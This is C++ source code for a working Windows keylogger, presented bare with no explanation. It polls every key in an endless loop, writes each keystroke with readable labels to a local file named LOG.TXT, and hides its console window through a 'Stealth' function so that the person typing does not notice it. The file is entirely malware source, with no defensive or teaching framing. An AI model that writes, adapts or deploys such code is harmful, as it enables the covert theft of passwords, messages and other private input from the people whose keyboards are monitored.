#include <iostream>
using namespace std;
#include <windows.h>
#include <winuser.h>
 
int Save (int key_stroke, char *file);
void Stealth();
 
int main (){
    Stealth ();
    char i;
     
    while (1){
          for(i = 8; i<= 222; i++){
                if (GetAsyncKeyState(i) == -32767) Save (i,"LOG.TXT");
          }     
    }
    system ("PAUSE");
    return 0;
}

//Save(int, char)
int Save (int key_stroke, char *file)
{
    if ( (key_stroke == 1) || (key_stroke == 2) )
    return 0;
     
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");
    cout << key_stroke << endl;
     
    switch (key_stroke){
//           case 8: fprintf(OUTPUT_FILE, "%s", "[B]"); break;
//           case 13: fprintf(OUTPUT_FILE, "%s", "\n"); break;
           case 18: fprintf(OUTPUT_FILE, "%s", "[A]"); break;
           case 19: fprintf(OUTPUT_FILE, "%s", "[P]"); break;
//           case 20: fprintf(OUTPUT_FILE, "%s", "[CAPS]"); break;
//           case 32: fprintf(OUTPUT_FILE, "%s", " "); break;
//           case 33: fprintf(OUTPUT_FILE, "%s", "[PU]"); break;
//           case 34: fprintf(OUTPUT_FILE, "%s", "[PD]"); break;
           case 44: fprintf(OUTPUT_FILE, "%s", "[PS]"); break;
           case 45: fprintf(OUTPUT_FILE, "%s", "[INS]"); break;
           case 91: fprintf(OUTPUT_FILE, "%s", "[Lwin]"); break;
           case 92: fprintf(OUTPUT_FILE, "%s", "[Rwin]"); break;
           
           case VK_NUMPAD0: fprintf(OUTPUT_FILE, "%s", "[0]"); break;
           case VK_NUMPAD1: fprintf(OUTPUT_FILE, "%s", "[1]"); break;
           case VK_NUMPAD2: fprintf(OUTPUT_FILE, "%s", "[2]"); break;
           case VK_NUMPAD3: fprintf(OUTPUT_FILE, "%s", "[3]"); break;
           case VK_NUMPAD4: fprintf(OUTPUT_FILE, "%s", "[4]"); break;
           case VK_NUMPAD5: fprintf(OUTPUT_FILE, "%s", "[5]"); break;
           case VK_NUMPAD6: fprintf(OUTPUT_FILE, "%s", "[6]"); break;
           case VK_NUMPAD7: fprintf(OUTPUT_FILE, "%s", "[7]"); break;
           case VK_NUMPAD8: fprintf(OUTPUT_FILE, "%s", "[8]"); break;
           case VK_NUMPAD9: fprintf(OUTPUT_FILE, "%s", "[9]"); break;
           case VK_NUMLOCK: fprintf(OUTPUT_FILE, "%s", "[NUML]"); break;
           case VK_SCROLL: fprintf(OUTPUT_FILE, "%s", "[SCRL]"); break;
           
           case VK_DECIMAL: fprintf(OUTPUT_FILE, "%s", "."); break;
           case VK_MULTIPLY: fprintf(OUTPUT_FILE, "%s", "[*]"); break;
           case VK_ADD: fprintf(OUTPUT_FILE, "%s", "[+]"); break;
           case VK_SUBTRACT: fprintf(OUTPUT_FILE, "%s", "[-]"); break;
           case VK_DIVIDE: fprintf(OUTPUT_FILE, "%s", "[/]"); break;
           
           case VK_F1: fprintf(OUTPUT_FILE, "%s", "[F1]"); break;
           case VK_F2: fprintf(OUTPUT_FILE, "%s", "[F2]"); break;
           case VK_F3: fprintf(OUTPUT_FILE, "%s", "[F3]"); break;
           case VK_F4: fprintf(OUTPUT_FILE, "%s", "[F4]"); break;
           case VK_F5: fprintf(OUTPUT_FILE, "%s", "[F5]"); break;
           case VK_F6: fprintf(OUTPUT_FILE, "%s", "[F6]"); break;
           case VK_F7: fprintf(OUTPUT_FILE, "%s", "[F7]"); break;
           case VK_F8: fprintf(OUTPUT_FILE, "%s", "[F8]"); break;
           case VK_F9: fprintf(OUTPUT_FILE, "%s", "[F9]"); break;
           case VK_F10: fprintf(OUTPUT_FILE, "%s", "[F10]"); break;
           case VK_F11: fprintf(OUTPUT_FILE, "%s", "[F11]"); break;
           case VK_F12: fprintf(OUTPUT_FILE, "%s", "[F12]"); break;
           case VK_F13: fprintf(OUTPUT_FILE, "%s", "[F13]"); break;
           case VK_F14: fprintf(OUTPUT_FILE, "%s", "[F14]"); break;
           case VK_F15: fprintf(OUTPUT_FILE, "%s", "[F15]"); break;
           case VK_F16: fprintf(OUTPUT_FILE, "%s", "[F16]"); break;
           case VK_F17: fprintf(OUTPUT_FILE, "%s", "[F17]"); break;
           case VK_F18: fprintf(OUTPUT_FILE, "%s", "[F18]"); break;
           case VK_F19: fprintf(OUTPUT_FILE, "%s", "[F19]"); break;
           case VK_F20: fprintf(OUTPUT_FILE, "%s", "[F20]"); break;
           case VK_F21: fprintf(OUTPUT_FILE, "%s", "[F21]"); break;
           case VK_F22: fprintf(OUTPUT_FILE, "%s", "[F22]"); break;
           case VK_F23: fprintf(OUTPUT_FILE, "%s", "[F23]"); break;
           case VK_F24: fprintf(OUTPUT_FILE, "%s", "[F24]"); break;
           
           case VK_OEM_1:
           case 59: fprintf(OUTPUT_FILE, "%s", ";"); break;
           
           case 187: fprintf(OUTPUT_FILE, "%s", "+"); break;
           case 188: fprintf(OUTPUT_FILE, "%s", ","); break;
           case 189: fprintf(OUTPUT_FILE, "%s", "-"); break;
           case 190: fprintf(OUTPUT_FILE, "%s", "."); break;
           case VK_OEM_2: fprintf(OUTPUT_FILE, "%s", "/"); break;
           case VK_OEM_3: fprintf(OUTPUT_FILE, "%s", "~"); break;
           case VK_OEM_4: fprintf(OUTPUT_FILE, "%s", "["); break;
           case VK_OEM_5: fprintf(OUTPUT_FILE, "%s", "\\"); break;
           case VK_OEM_6: fprintf(OUTPUT_FILE, "%s", "]"); break;
           case VK_OEM_7: fprintf(OUTPUT_FILE, "%s", "'"); break;
           
           case VK_SPACE: fprintf(OUTPUT_FILE, "%s", " "); break;
           case VK_BACK: fprintf(OUTPUT_FILE, "%s", "[B]"); break;
           case VK_RETURN: fprintf(OUTPUT_FILE, "%s", "\n"); break;
           case VK_OEM_CLEAR:
           case VK_CLEAR: fprintf(OUTPUT_FILE, "%s", "[CLEAR]"); break;
           case VK_TAB: fprintf(OUTPUT_FILE, "%s", "[T]"); break;
           case VK_SHIFT: fprintf(OUTPUT_FILE, "%s", "[S]"); break;
           case VK_CAPITAL: fprintf(OUTPUT_FILE, "%s", "[CAPS]"); break;
           case VK_ESCAPE: fprintf(OUTPUT_FILE, "%s", "[ESC]"); break;
           
           case VK_PRIOR: fprintf(OUTPUT_FILE, "%s", "[PU]"); break;
           case VK_NEXT: fprintf(OUTPUT_FILE, "%s", "[PD]"); break;
           case VK_END: fprintf(OUTPUT_FILE, "%s", "[END]"); break;
           case VK_HOME: fprintf(OUTPUT_FILE, "%s", "[H]"); break;
           
           case VK_SEPARATOR: fprintf(OUTPUT_FILE, "%s", "[SEP]"); break;
           case VK_SLEEP: fprintf(OUTPUT_FILE, "%s", "[SLEEP]"); break;
           case VK_LEFT: fprintf(OUTPUT_FILE, "%s", "[L]"); break;
           case VK_UP: fprintf(OUTPUT_FILE, "%s", "[U]"); break;
           case VK_RIGHT: fprintf(OUTPUT_FILE, "%s", "[R]"); break;
           case VK_DOWN: fprintf(OUTPUT_FILE, "%s", "[D]"); break;
           case VK_CONTROL: fprintf(OUTPUT_FILE, "%s", "[C]"); break;
           case VK_DELETE: fprintf(OUTPUT_FILE, "%s", "[DEL]"); break;
           
           case VK_LBUTTON: fprintf(OUTPUT_FILE, "%s", "[LClick]"); break;
           case VK_RBUTTON: fprintf(OUTPUT_FILE, "%s", "[RClick]"); break;
           
           default: fprintf(OUTPUT_FILE, "%s", &key_stroke); break;
    }
     
    fclose(OUTPUT_FILE);
    return 0;
}

//Stealth()
void Stealth(){
     HWND stealth;
     AllocConsole();
     stealth = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(stealth,0);
}
